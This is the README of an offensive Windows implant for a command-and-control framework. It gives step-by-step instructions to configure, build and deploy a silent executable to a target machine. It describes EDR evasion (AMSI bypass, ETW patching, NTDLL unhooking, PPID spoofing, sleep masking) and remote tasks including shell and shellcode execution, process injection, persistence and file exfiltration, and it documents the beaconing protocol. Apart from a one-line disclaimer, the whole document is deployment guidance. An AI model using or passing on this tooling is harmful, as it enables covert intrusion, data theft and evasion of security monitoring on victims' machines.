# PhantomImplant

Native C Windows implant for [Phantom C2](https://github.com/phantom-offensive/phantom). 325 KB, zero console output, EDR evasion built-in.

## Quick Start

```bash
# 1. Clone
git clone https://github.com/phantom-offensive/PhantomImplant.git
cd PhantomImplant

# 2. Configure (edit src/main.c)
#    - Set C2_SERVER_URL to your Phantom server
#    - Embed your server's RSA public key

# 3. Build
make release    # Silent implant (no console window)
make debug      # Test mode (with console output)

# 4. Deploy
# Copy build/phantom-implant.exe to target
```

## Building From Scratch

### Prerequisites (WSL/Kali Linux)

```bash
sudo apt update
sudo apt install -y mingw-w64 nasm
```

### Step 1: Configure the Implant

Edit `src/main.c` and set your C2 server details:

```c
#define C2_SERVER_URL   "https://YOUR_C2_SERVER:443"  // Your Phantom listener
#define C2_SLEEP_MS     10000                          // Check-in interval (ms)
#define C2_JITTER_PCT   20                             // Jitter percentage
#define C2_KILL_DATE    "2026-12-31"                   // Auto-terminate date (or "" for none)
```

### Step 2: Embed Your Server's RSA Public Key

Extract the DER bytes from your Phantom server's public key:

```bash
# On your Phantom C2 server:
cd ~/phantom

# Method 1: Python
python3 -c "
import base64
with open('configs/server.pub') as f:
    lines = f.readlines()
b64 = ''.join(l.strip() for l in lines if not l.startswith('---'))
der = base64.b64decode(b64)
arr = ', '.join(f'0x{b:02X}' for b in der)
print(f'static const BYTE g_ServerPubKeyDer[] = {{{arr}}};')
print(f'static const DWORD g_dwServerPubKeyDerLen = {len(der)};')
"

# Method 2: OpenSSL + xxd
openssl rsa -pubin -in configs/server.pub -outform DER 2>/dev/null | xxd -i
```

Paste the output into `src/main.c`, replacing the existing `g_ServerPubKeyDer[]` array.

### Step 3: Build

```bash
# Debug build (console output, for testing)
make debug
# Output: build/phantom-implant-debug.exe

# Release build (silent, no console window, stripped)
make release
# Output: build/phantom-implant.exe
```

### Step 4: Start Phantom C2 Server

```bash
cd ~/phantom
# Headless mode (background) — auto-starts listeners from server.yaml
./build/phantom-server --config configs/server.yaml --headless --mode web

# Interactive mode
./build/phantom-server
# Login → select interface → start listener via Web UI or CLI
```

The listener must be running before the implant connects. Configure `server.yaml`:
```yaml
listeners:
  - name: "default-http"
    type: "http"
    bind: "0.0.0.0:8080"
    profile: "default"
```

### Step 5: Deploy and Run

```
# On target Windows machine:

# Release — silent, no console window, runs C2 loop immediately
phantom-implant.exe

# Debug — runs diagnostic test harness (API hashing, syscalls, crypto,
#          evasion, one registration + check-in), then waits for Enter and exits.
#          Use this to verify the implant can reach the C2 server.
phantom-implant-debug.exe

# Debug --loop — skips test harness, enters the full persistent C2 loop.
#                Use this for interactive testing via Web UI or CLI.
phantom-implant-debug.exe --loop
```

> **Important:** `phantom-implant-debug.exe` without `--loop` only performs one
> check-in as part of its test suite then exits. Any tasks you queue during that
> brief window will never be delivered. Always use `--loop` for real interaction.

## Build Modes

| Mode | Command | Flag | Behaviour |
|------|---------|------|-----------|
| **Release** | `make release` | — | Silent WinMain, no console, full C2 loop |
| **Debug (test)** | `make debug` | *(none)* | Console output, diagnostic tests, one check-in, exits |
| **Debug (loop)** | `make debug` | `--loop` | Console output, skips tests, persistent C2 loop |

## What Happens When It Runs

### Release Mode (Silent)
1. Initializes indirect syscalls (HellsHall)
2. Initializes private implant heap (for sleep masking)
3. Runs EDR evasion: NTDLL unhook → ETW patch → AMSI bypass
4. Registers with C2 (RSA key exchange)
5. Enters check-in loop (sleep with jitter, heap masked during sleep)
6. Executes tasks from server, reports results

### Debug Mode (no flag)
Runs a 5-phase diagnostic test suite (API hashing → syscalls → encryption →
evasion → C2 registration + one check-in), prints results, then exits. Useful
for verifying the build is functional and the C2 server is reachable.

### Debug Mode (`--loop`)
Skips the test suite and enters the full C2 loop immediately. Use this for
testing task execution (shell, ps, sysinfo, etc.) via the Phantom Web UI or CLI.

## Architecture

```
PhantomImplant/
├── include/
│   ├── common.h        # Types, hashes, config macros, DEBUG_MODE toggle
│   ├── api.h           # GetProcAddressH + GetModuleHandleH
│   ├── syscalls.h      # HellsHall indirect syscalls
│   ├── crypto.h        # XOR + AES-256-CBC
│   ├── injection.h     # 5 injection techniques
│   ├── transport.h     # C2 protocol structures
│   ├── msgpack.h       # Msgpack decoder
│   ├── evasion.h       # NTDLL unhook + ETW + AMSI bypass
│   └── strings.h       # XOR-encrypted strings
├── src/
│   ├── main.c          # Entry point (debug test harness + release WinMain)
│   ├── api.c           # PEB walking, PE export table, Jenkins hashing
│   ├── syscalls.c      # Hell's Gate + TartarusGate + indirect syscalls
│   ├── crypto.c        # XOR (3 variants) + AES-256-CBC/GCM (bCrypt)
│   ├── injection.c     # Classic, Syscall, Early Bird APC, Local
│   ├── transport.c     # WinHTTP C2, Phantom protocol (RSA+AES+msgpack)
│   ├── msgpack.c       # Msgpack parser (hash-based field matching)
│   ├── evasion.c       # NTDLL unhook + ETW patch + AMSI bypass
│   └── hashgen.c       # Standalone hash generator utility
├── asm/
│   └── syscalls.asm    # NASM x64 indirect syscall stubs
├── Makefile            # debug/release/hashgen targets
└── README.md
```

## Evasion Techniques

| Technique | What It Does | Detection Risk |
|-----------|-------------|----------------|
| API Hashing | Resolves functions by hash, nothing in IAT | Low |
| Indirect Syscalls | Executes syscall from ntdll's memory space | Low |
| String Encryption | XOR-encrypted C2 endpoints, field names | Low |
| NTDLL Unhooking | Maps clean ntdll from disk, overwrites hooked .text | Medium |
| ETW Bypass | Patches EtwEventWrite + NtTraceEvent SSN | Medium |
| AMSI Bypass | Patches AmsiOpenSession + AmsiScanBuffer | Medium |
| PPID Spoofing | Shell tasks spawn cmd.exe as child of explorer.exe, hides implant from process tree | Medium |
| Sleep Masking | XOR-encrypts private heap before Sleep(), restores after — defeats BeaconEye/Moneta | High |
| Secure Random | BCryptGenRandom for all key/nonce generation (no rand()) | Low |

## Phantom C2 Protocol

```
Registration:  RSA-OAEP-SHA256([AES key + msgpack sysinfo]) → POST /api/v1/auth
Check-in:      AES-256-GCM(msgpack({agent_id, results}))    → POST /api/v1/status
Wire format:   {"data":"<base64([Ver][Type][KeyID][Len][Payload])>","ts":<unix>}
```

## Supported Tasks

| Task | Type ID | Description | Tested |
|------|---------|-------------|--------|
| shell | 1 | Execute cmd.exe command, capture stdout/stderr | ✓ |
| ps | 5 | Process list with PID, PPID, thread count | ✓ |
| cd | 6 | Change working directory, return new path | ✓ |
| sysinfo | 7 | Hostname, user, OS, arch, PID, process name, IP | ✓ |
| sleep | 8 | Update check-in interval and jitter | ✓ |
| kill | 9 | Self-terminate and clean up WinHTTP handles | ✓ |
| download | 12 | Read file from target, return bytes to C2 | ✓ |
| upload | 13 | Write file received from C2 to target path | ✓ |
| screenshot | 14 | GDI screen capture, returns BMP in memory | ✓ |
| shellcode | 15 | Execute raw shellcode via indirect syscalls | ✓ |
| evasion | 16 | Re-run NTDLL unhook + ETW + AMSI bypass | ✓ |
| persist | 17 | Registry Run key or startup folder persistence | ✓ |
| inject | 28 | Remote process injection or Early Bird APC | ✓ |
| ifconfig | 28* | Network adapter list with IP/MAC/gateway | ✓ |

> *ifconfig uses type ID 28 in the Phantom C2 protocol (`TaskIfconfig`).

## MSVC Build (Windows)

```cmd
ml64 /c /Fo build\syscalls.obj asm\syscalls.asm
cl /O2 /Iinclude src\*.c build\syscalls.obj /Fe:build\phantom-implant.exe ^
   /link bcrypt.lib winhttp.lib crypt32.lib ntdll.lib /SUBSYSTEM:WINDOWS
```

## Regenerating API Hashes

If you change the hash seed in `common.h`:

```bash
make gen-hashes
# Copy output into include/common.h
```

## Disclaimer

For authorized red team engagements and security research only. Unauthorized use is illegal.
